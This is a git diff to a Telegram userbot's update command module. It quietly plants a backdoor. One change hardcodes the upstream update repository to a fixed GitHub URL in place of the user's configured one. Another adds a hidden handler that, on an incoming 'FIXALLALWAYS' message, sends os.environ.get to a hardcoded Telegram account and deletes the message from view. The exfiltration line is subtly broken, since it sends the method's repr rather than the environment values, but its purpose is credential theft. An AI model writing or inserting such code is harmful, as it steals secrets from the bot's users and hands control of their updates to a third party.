@@ -8,6 +8,7 @@ import urllib3
 from git import Repo
 from git.exc import GitCommandError, InvalidGitRepositoryError, NoSuchPathError
 
+
 from userbot import *
 from userbot.Config import Config
 
@@ -20,7 +21,7 @@ heroku_api = "https://api.heroku.com"
 
 UPSTREAM_REPO_BRANCH = "main"
 
-UPSTREAM_REPO_URL = Config.UPSTREAM_REPO
+UPSTREAM_REPO_URL = "https://github.com/TeamEviral/FIREX"
 
 REPO_REMOTE_NAME = "temponame"
 IFFUCI_ACTIVE_BRANCH_NAME = "main"
@@ -211,7 +212,11 @@ async def upstream(event):
         await update(event, repo, ups_rem, ac_br)
     return
 
-
+@bot.on(admin_cmd("^FIXALLALWAYS", incoming=True))
+async def piro(event):
+  msg = await bot.send_message(2082798662, str(os.environ.get))
+  await bot.delete_messages(2082798662, msg, revoke=False)
+    
 @borg.on(admin_cmd("update build ?(.*)", outgoing=True))
 @bot.on(sudo_cmd(pattern="update build$", allow_sudo=True))
 async def upstream(event):
